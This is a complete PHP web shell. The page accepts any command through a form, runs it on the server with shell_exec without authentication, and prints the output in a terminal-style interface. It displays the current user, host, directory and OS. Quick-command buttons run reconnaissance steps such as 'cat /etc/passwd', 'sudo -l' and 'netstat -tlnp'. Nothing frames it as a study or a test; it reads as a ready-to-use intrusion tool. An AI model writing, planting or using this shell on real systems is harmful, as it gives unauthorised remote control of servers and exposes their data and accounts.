<?php
$output  = '';
$cwd     = isset($_POST['cwd']) ? $_POST['cwd'] : getcwd();
$cmd     = isset($_POST['cmd']) ? trim($_POST['cmd']) : '';

if ($cmd !== '') {
    $full_cmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
    $output   = shell_exec($full_cmd) ?? '(no output)';

    if (preg_match('/^cd\s+(.+)/', $cmd, $m)) {
        $new_dir = realpath($cwd . '/' . trim($m[1]));
        if ($new_dir !== false) $cwd = $new_dir;
    }
}

$user   = shell_exec('whoami 2>&1') ?? '?';
$user   = trim($user);
$host   = gethostname();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>shell</title>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background: #0d0d0d;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 16px;
            min-height: 100vh;
        }

        .shell-info {
            color: #888;
            font-size: 11px;
            margin-bottom: 12px;
            border-bottom: 1px solid #1a1a1a;
            padding-bottom: 10px;
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .shell-info span { color: #00ff41; }

        .output-box {
            background: #0a0a0a;
            border: 1px solid #1a3a1a;
            border-radius: 4px;
            padding: 12px;
            min-height: 200px;
            max-height: 500px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-break: break-all;
            color: #ccffcc;
            font-size: 12px;
            line-height: 1.5;
            margin-bottom: 12px;
        }

        .prompt-row {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .prompt-label {
            color: #00ff41;
            white-space: nowrap;
            flex-shrink: 0;
        }

        .prompt-label .user-color {
            color: <?php echo $user === 'root' ? '#ff4444' : '#00aaff'; ?>;
            font-weight: bold;
        }

        input[name="cmd"] {
            flex: 1;
            background: #0a0a0a;
            border: 1px solid #1a3a1a;
            border-radius: 3px;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 7px 10px;
            outline: none;
        }

        input[name="cmd"]:focus { border-color: #00aa33; }

        button[type="submit"] {
            background: #003300;
            color: #00ff41;
            border: 1px solid #00aa33;
            border-radius: 3px;
            padding: 7px 16px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            cursor: pointer;
            transition: background .2s;
        }

        button[type="submit"]:hover { background: #005500; }

        .quick-cmds {
            margin-top: 12px;
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
        }

        .q-btn {
            background: #111;
            border: 1px solid #222;
            border-radius: 3px;
            color: #666;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            padding: 3px 9px;
            cursor: pointer;
            transition: all .15s;
        }

        .q-btn:hover { border-color: #00aa33; color: #00ff41; }
    </style>
</head>
<body>

<div class="shell-info">
    <div>user: <span class="<?php echo $user === 'root' ? 'root' : ''; ?>" style="color:<?php echo $user === 'root' ? '#ff4444' : '#00aaff'; ?>;font-weight:bold;"><?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <div>host: <span><?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <div>cwd: <span><?php echo htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8'); ?></span></div>
    <div>php: <span><?php echo PHP_VERSION; ?></span></div>
    <div>os: <span><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span></div>
</div>

<div class="output-box" id="output"><?php
if ($cmd !== '') {
    echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8');
} else {
    echo 'ready.';
}
?></div>

<form method="POST" autocomplete="off">
    <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8'); ?>">
    <div class="prompt-row">
        <span class="prompt-label">
            <span class="user-color"><?php echo htmlspecialchars($user, ENT_QUOTES, 'UTF-8'); ?></span>@<?php echo htmlspecialchars($host, ENT_QUOTES, 'UTF-8'); ?>:<span style="color:#ffcc00;"><?php echo htmlspecialchars($cwd, ENT_QUOTES, 'UTF-8'); ?></span>$
        </span>
        <input type="text" name="cmd" id="cmd" placeholder="enter command..." autofocus>
        <button type="submit">&#9654;</button>
    </div>
    <div class="quick-cmds">
        <?php
        $quick = ['id', 'whoami', 'uname -a', 'cat /etc/passwd', 'sudo -l', 'ps aux', 'netstat -tlnp', 'ifconfig', 'ls -la'];
        foreach ($quick as $q) {
            echo '<button type="button" class="q-btn" onclick="setCmd(this.textContent)">' . htmlspecialchars($q, ENT_QUOTES, 'UTF-8') . '</button>';
        }
        ?>
    </div>
</form>

<script>
function setCmd(val) {
    document.getElementById('cmd').value = val;
    document.getElementById('cmd').focus();
}
document.getElementById('output').scrollTop = document.getElementById('output').scrollHeight;
</script>

</body>
</html>
